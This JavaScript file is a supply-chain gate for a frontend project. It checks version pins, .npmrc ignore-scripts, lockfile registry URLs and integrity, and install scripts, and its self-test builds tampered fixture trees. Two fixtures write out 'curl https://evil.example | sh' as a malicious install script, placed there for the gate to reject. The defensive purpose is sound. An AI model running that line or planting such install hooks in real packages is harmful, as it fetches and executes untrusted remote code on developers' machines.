// Dependency gate for the frontend. It checks package.json, .npmrc, the lockfile
// and every installed package against one policy. Node built-ins only. It runs in
// `npm run verify`. `npm run check:deps` runs the self-test first: it builds
// simulated trees (nothing installed, installed and matching, tampered) and checks
// the gate on each.
//
// Policy.
//   1. Each direct dependency in package.json is an exact x.y.z pin.
//   2. .npmrc sets ignore-scripts=true.
//   3. The lock root entry declares exactly the package.json dependencies.
//   4. Each locked package is a registry tarball of its own name. resolved is
//      exactly https://registry.npmjs.org/<name>/-/<basename>-<version>.tgz; the
//      integrity is a sha512 SRI string; the version is an exact pin; the entry is
//      not a link; and an entry's name, when it has one, equals its path name, so
//      an alias is refused.
//   5. No locked package has an install script (hasInstallScript). The one
//      exception is node_modules/fsevents, which must match the identity pinned
//      below: name, version, integrity, os exactly ["darwin"], optional. The
//      exception is decided by the lock entry, never by whether fsevents is
//      installed on this machine.
//   6. Every installed package (nested ones too) is a locked path, with the locked
//      name and version. A directory under node_modules must have a package.json,
//      and a symbolic link fails. A declared preinstall, install or postinstall
//      script fails, except fsevents, whose scripts must equal the pinned object.
//
// `prepare` is not checked: npm runs it for git and local packages only.
import { existsSync, mkdirSync, mkdtempSync, readFileSync, readdirSync, rmSync, symlinkSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { fileURLToPath } from 'node:url';

const INSTALL_HOOKS = ['preinstall', 'install', 'postinstall'];
const EXACT_VERSION = /^\d+\.\d+\.\d+$/;
const LOCKED_VERSION = /^\d+\.\d+\.\d+(?:-[0-9A-Za-z.-]+)?$/;
const SHA512_SRI = /^sha512-[A-Za-z0-9+/]{86}==$/;
const REGISTRY = 'https://registry.npmjs.org/';

// The one install-script exception: fsevents 2.3.3, macOS only. Its tarball
// integrity and its scripts are recorded here, so a different package fails.
const FSEVENTS = {
  path: 'node_modules/fsevents',
  name: 'fsevents',
  version: '2.3.3',
  integrity: 'sha512-5xoDfX+fL7faATnagmWPpbFtwh/R77WmMMqqHGS65C3vvB0YHrgF+B1YmZ3441tMj5n63k0212XNoJwzlhffQw==',
  os: ['darwin'],
  scripts: {
    build: 'node-gyp clean && rm -f fsevents.node && node-gyp rebuild && node-gyp clean',
    clean: 'node-gyp clean && rm -f fsevents.node',
    install: 'node-gyp rebuild',
    prepublishOnly: 'npm run build',
    test: '/bin/bash ./test.sh 2>/dev/null',
  },
};

// The package name of a lock path: the part after the last node_modules/.
function nameFromPath(path) {
  const marker = 'node_modules/';
  const at = path.lastIndexOf(marker);
  return at < 0 ? null : path.slice(at + marker.length);
}

function canonical(value) {
  if (Array.isArray(value)) return value.map(canonical);
  if (value && typeof value === 'object') {
    return Object.fromEntries(Object.keys(value).sort().map((key) => [key, canonical(value[key])]));
  }
  return value;
}

function same(left, right) {
  return JSON.stringify(canonical(left)) === JSON.stringify(canonical(right));
}

function fseventsIdentity(meta) {
  const problems = [];
  if ((meta.name ?? FSEVENTS.name) !== FSEVENTS.name) problems.push('is not the fsevents package');
  if (meta.version !== FSEVENTS.version) problems.push(`is version ${meta.version}, pinned ${FSEVENTS.version}`);
  if (meta.integrity !== FSEVENTS.integrity) problems.push('does not have the pinned integrity');
  if (!same(meta.os, FSEVENTS.os)) problems.push(`has os ${JSON.stringify(meta.os)}, pinned ${JSON.stringify(FSEVENTS.os)}`);
  if (meta.optional !== true) problems.push('is not optional');
  return problems;
}

// Installed packages under a node_modules directory, nested ones included.
// Failures for symbolic links and for directories without a package.json are
// added to `failures`.
function listInstalled(nodeModules, prefix, failures) {
  const found = [];
  if (!existsSync(nodeModules)) return found;
  const candidates = [];
  for (const entry of readdirSync(nodeModules, { withFileTypes: true })) {
    if (entry.name.startsWith('.')) continue;
    const dir = join(nodeModules, entry.name);
    if (entry.isSymbolicLink()) {
      failures.push(`${prefix}/${entry.name}: symbolic link under node_modules`);
    } else if (entry.name.startsWith('@') && entry.isDirectory()) {
      for (const sub of readdirSync(dir, { withFileTypes: true })) {
        if (sub.isSymbolicLink()) failures.push(`${prefix}/${entry.name}/${sub.name}: symbolic link under node_modules`);
        else if (sub.isDirectory()) candidates.push({ path: `${prefix}/${entry.name}/${sub.name}`, dir: join(dir, sub.name) });
      }
    } else if (entry.isDirectory()) {
      candidates.push({ path: `${prefix}/${entry.name}`, dir });
    }
  }
  for (const { path, dir } of candidates) {
    if (existsSync(join(dir, 'package.json'))) {
      found.push({ path, dir });
    } else {
      failures.push(`${path}: installed directory without a package.json`);
    }
    found.push(...listInstalled(join(dir, 'node_modules'), `${path}/node_modules`, failures));
  }
  return found;
}

// checkTree returns the failures for the tree at `root`, and counts for the
// success line. It reads only the files it checks.
export function checkTree(root) {
  const failures = [];
  const read = (file) => JSON.parse(readFileSync(join(root, file), 'utf8'));
  const manifest = read('package.json');
  const lock = read('package-lock.json');
  const packages = lock.packages ?? {};
  const direct = { ...manifest.dependencies, ...manifest.devDependencies };

  for (const [name, spec] of Object.entries(direct)) {
    if (!EXACT_VERSION.test(spec)) failures.push(`package.json: ${name} is not an exact version pin (${spec})`);
  }

  const npmrc = readFileSync(join(root, '.npmrc'), 'utf8');
  if (!/^ignore-scripts=true$/m.test(npmrc)) failures.push('.npmrc: ignore-scripts=true is missing');

  const rootEntry = packages[''] ?? {};
  if (!same(rootEntry.dependencies ?? {}, manifest.dependencies ?? {})) {
    failures.push('package-lock.json: root dependencies differ from package.json');
  }
  if (!same(rootEntry.devDependencies ?? {}, manifest.devDependencies ?? {})) {
    failures.push('package-lock.json: root devDependencies differ from package.json');
  }

  for (const [name, spec] of Object.entries(direct)) {
    const entry = packages[`node_modules/${name}`];
    if (!entry) {
      failures.push(`package-lock.json: direct dependency ${name} is missing`);
    } else if (entry.version !== spec) {
      failures.push(`package-lock.json: ${name} is ${entry.version}, package.json pins ${spec}`);
    }
  }

  let exceptions = 0;
  let locked = 0;
  for (const [path, meta] of Object.entries(packages)) {
    if (path === '') continue;
    locked += 1;
    const name = nameFromPath(path);
    if (name === null || !path.startsWith('node_modules/')) {
      failures.push(`package-lock.json: ${path} is not under node_modules/`);
      continue;
    }
    if (meta.link) failures.push(`package-lock.json: ${path} is a link entry`);
    if (meta.name !== undefined && meta.name !== name) {
      failures.push(`package-lock.json: ${path} is an alias (lock name "${meta.name}")`);
    }
    if (!LOCKED_VERSION.test(meta.version ?? '')) {
      failures.push(`package-lock.json: ${path} version "${meta.version}" is not an exact pin`);
    }
    const expected = `${REGISTRY}${name}/-/${name.split('/').pop()}-${meta.version}.tgz`;
    if (meta.resolved !== expected) {
      failures.push(`package-lock.json: ${path} resolves to "${meta.resolved ?? 'nothing'}", not ${expected}`);
    }
    if (!SHA512_SRI.test(meta.integrity ?? '')) {
      failures.push(`package-lock.json: ${path} has no sha512 integrity`);
    }
    const identity = path === FSEVENTS.path ? fseventsIdentity(meta) : [];
    for (const problem of identity) failures.push(`package-lock.json: ${path} ${problem}`);
    if (meta.hasInstallScript) {
      if (path === FSEVENTS.path && identity.length === 0) {
        exceptions += 1;
      } else {
        failures.push(`package-lock.json: ${path} has an install script (hasInstallScript)`);
      }
    }
  }

  const installed = listInstalled(join(root, 'node_modules'), 'node_modules', failures);
  for (const { path, dir } of installed) {
    const meta = packages[path];
    if (!meta) {
      failures.push(`${path}: installed but not in the lockfile`);
      continue;
    }
    const found = JSON.parse(readFileSync(join(dir, 'package.json'), 'utf8'));
    const expectedName = meta.name ?? nameFromPath(path);
    if (found.name !== expectedName) {
      failures.push(`${path}: installed package is named "${found.name}", locked as "${expectedName}"`);
    }
    if (found.version !== meta.version) {
      failures.push(`${path}: installed version ${found.version}, locked ${meta.version}`);
    }
    const scripts = found.scripts ?? {};
    if (path === FSEVENTS.path) {
      if (!same(scripts, FSEVENTS.scripts)) failures.push(`${path}: installed scripts differ from the pinned fsevents scripts`);
    } else {
      for (const hook of INSTALL_HOOKS) {
        if (scripts[hook] !== undefined) failures.push(`${path}: installed package declares a "${hook}" script`);
      }
    }
  }

  return {
    failures,
    counts: {
      direct: Object.keys(direct).length,
      locked,
      installed: installed.length,
      exceptions,
      fseventsInstalled: installed.some((entry) => entry.path === FSEVENTS.path),
    },
  };
}

const INTEGRITY = `sha512-${'A'.repeat(86)}==`;
const resolvedFor = (name, version) => `${REGISTRY}${name}/-/${name.split('/').pop()}-${version}.tgz`;
const lockEntry = (name, version) => ({ version, resolved: resolvedFor(name, version), integrity: INTEGRITY });

function baseTree() {
  return {
    manifest: { name: 'fixture', version: '0.0.0', dependencies: { react: '19.3.0' }, devDependencies: { vite: '8.3.4' } },
    npmrc: 'ignore-scripts=true\nsave-exact=true\n',
    lock: {
      lockfileVersion: 3,
      packages: {
        '': { name: 'fixture', version: '0.0.0', dependencies: { react: '19.3.0' }, devDependencies: { vite: '8.3.4' } },
        'node_modules/react': lockEntry('react', '19.3.0'),
        'node_modules/vite': lockEntry('vite', '8.3.4'),
        [FSEVENTS.path]: {
          version: FSEVENTS.version,
          resolved: resolvedFor('fsevents', FSEVENTS.version),
          integrity: FSEVENTS.integrity,
          os: FSEVENTS.os,
          optional: true,
          hasInstallScript: true,
        },
      },
    },
    installed: {},
    emptyDirs: [],
    symlinks: [],
  };
}

function writeTree(tree) {
  const dir = mkdtempSync(join(tmpdir(), 'tbound-deps-'));
  writeFileSync(join(dir, 'package.json'), JSON.stringify(tree.manifest, null, 2));
  writeFileSync(join(dir, '.npmrc'), tree.npmrc);
  writeFileSync(join(dir, 'package-lock.json'), JSON.stringify(tree.lock, null, 2));
  for (const [path, manifest] of Object.entries(tree.installed)) {
    mkdirSync(join(dir, path), { recursive: true });
    writeFileSync(join(dir, path, 'package.json'), JSON.stringify(manifest));
  }
  for (const path of tree.emptyDirs) mkdirSync(join(dir, path), { recursive: true });
  for (const path of tree.symlinks) {
    mkdirSync(join(dir, 'node_modules'), { recursive: true });
    symlinkSync(tmpdir(), join(dir, path), 'dir');
  }
  return dir;
}

// Each case mutates the base tree. A 'pass' case must produce no failure; a
// 'fail' case must produce at least one.
const CASES = [
  ['base tree, nothing installed', 'pass', () => {}],
  ['installed packages match the lock', 'pass', (t) => {
    t.installed['node_modules/react'] = { name: 'react', version: '19.3.0' };
    t.installed['node_modules/vite'] = { name: 'vite', version: '8.3.4' };
  }],
  ['fsevents installed with the pinned manifest (darwin)', 'pass', (t) => {
    t.installed[FSEVENTS.path] = { name: 'fsevents', version: FSEVENTS.version, os: ['darwin'], scripts: FSEVENTS.scripts };
  }],
  ['fsevents installed with an evil install script', 'fail', (t) => {
    t.installed[FSEVENTS.path] = { name: 'fsevents', version: FSEVENTS.version, scripts: { ...FSEVENTS.scripts, install: 'curl https://evil.example | sh' } };
  }],
  ['fsevents installed with an added postinstall', 'fail', (t) => {
    t.installed[FSEVENTS.path] = { name: 'fsevents', version: FSEVENTS.version, scripts: { ...FSEVENTS.scripts, postinstall: 'curl https://evil.example | sh' } };
  }],
  ['fsevents replaced by a manifest with another name', 'fail', (t) => {
    t.installed[FSEVENTS.path] = { name: 'evil', version: FSEVENTS.version, scripts: FSEVENTS.scripts };
  }],
  ['fsevents installed at another version', 'fail', (t) => {
    t.installed[FSEVENTS.path] = { name: 'fsevents', version: '9.9.9', scripts: FSEVENTS.scripts };
  }],
  ['fsevents lock entry with another integrity', 'fail', (t) => {
    t.lock.packages[FSEVENTS.path].integrity = INTEGRITY;
  }],
  ['fsevents lock entry allowed on linux', 'fail', (t) => {
    t.lock.packages[FSEVENTS.path].os = ['linux'];
  }],
  ['fsevents lock entry not optional', 'fail', (t) => {
    t.lock.packages[FSEVENTS.path].optional = false;
  }],
  ['a second install script in the lock', 'fail', (t) => {
    t.lock.packages['node_modules/react'].hasInstallScript = true;
  }],
  ['integrity deleted from a package', 'fail', (t) => {
    delete t.lock.packages['node_modules/react'].integrity;
  }],
  ['resolved points at another package', 'fail', (t) => {
    t.lock.packages['node_modules/react'].resolved = `${REGISTRY}evil/-/evil-19.3.0.tgz`;
  }],
  ['resolved over http', 'fail', (t) => {
    t.lock.packages['node_modules/react'].resolved = 'http://registry.npmjs.org/react/-/react-19.3.0.tgz';
  }],
  ['resolved from git', 'fail', (t) => {
    t.lock.packages['node_modules/react'].resolved = 'git+https://github.com/facebook/react.git';
  }],
  ['alias: lock name differs from the path', 'fail', (t) => {
    t.lock.packages['node_modules/react'] = { ...lockEntry('evil', '19.3.0'), name: 'evil' };
  }],
  ['lock entry outside node_modules', 'fail', (t) => {
    t.lock.packages['packages/evil'] = lockEntry('evil', '1.0.0');
  }],
  ['direct dependency is a range', 'fail', (t) => {
    t.manifest.dependencies.react = '^19.3.0';
  }],
  ['lock root omits a direct dependency', 'fail', (t) => {
    delete t.lock.packages[''].devDependencies.vite;
  }],
  ['direct dependency missing from the lock', 'fail', (t) => {
    delete t.lock.packages['node_modules/vite'];
  }],
  ['ignore-scripts not set', 'fail', (t) => {
    t.npmrc = 'save-exact=true\n';
  }],
  ['installed package not in the lock', 'fail', (t) => {
    t.installed['node_modules/evil'] = { name: 'evil', version: '1.0.0' };
  }],
  ['installed version differs from the lock', 'fail', (t) => {
    t.installed['node_modules/react'] = { name: 'react', version: '19.3.1' };
  }],
  ['installed package declares a postinstall', 'fail', (t) => {
    t.installed['node_modules/react'] = { name: 'react', version: '19.3.0', scripts: { postinstall: 'node x.js' } };
  }],
  ['installed directory without package.json', 'fail', (t) => {
    t.emptyDirs.push('node_modules/leftover');
  }],
  ['symbolic link under node_modules', 'fail', (t) => {
    t.symlinks.push('node_modules/linked');
  }],
];

function selfTest() {
  const failures = [];
  let rejected = 0;
  let accepted = 0;
  for (const [name, want, mutate] of CASES) {
    const tree = baseTree();
    mutate(tree);
    const dir = writeTree(tree);
    try {
      const { failures: found } = checkTree(dir);
      if (want === 'pass' && found.length > 0) failures.push(`${name}: expected pass, got ${found.join(' | ')}`);
      if (want === 'fail' && found.length === 0) failures.push(`${name}: expected a failure, got none`);
      if (want === 'fail' && found.length > 0) rejected += 1;
      if (want === 'pass' && found.length === 0) accepted += 1;
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  }
  if (failures.length > 0) {
    for (const failure of failures) console.error(`check:deps: self-test: ${failure}`);
    console.error(`check:deps: self-test FAILED (${failures.length} case(s))`);
    return 1;
  }
  console.log(`check:deps: self-test OK (${CASES.length} cases: ${rejected} rejected, ${accepted} accepted)`);
  return 0;
}

function scanRealTree() {
  const root = fileURLToPath(new URL('..', import.meta.url));
  const { failures, counts } = checkTree(root);
  if (failures.length > 0) {
    for (const failure of failures) console.error(`check:deps: ${failure}`);
    console.error(`check:deps: FAILED (${failures.length} finding(s))`);
    return 1;
  }
  console.log(
    `check:deps: OK (${counts.direct} direct, ${counts.locked} locked packages, ` +
      `${counts.installed} installed manifests checked against the lock, 0 install hooks in installed packages, ` +
      `fsevents exception: ${counts.exceptions} lock entry, ` +
      `${counts.fseventsInstalled ? 'installed with the pinned scripts' : 'not installed on this platform'}; ` +
      'exact pins, registry-only, sha512 on every entry)',
  );
  return 0;
}

process.exitCode = process.argv.includes('--self-test') ? selfTest() : scanRealTree();
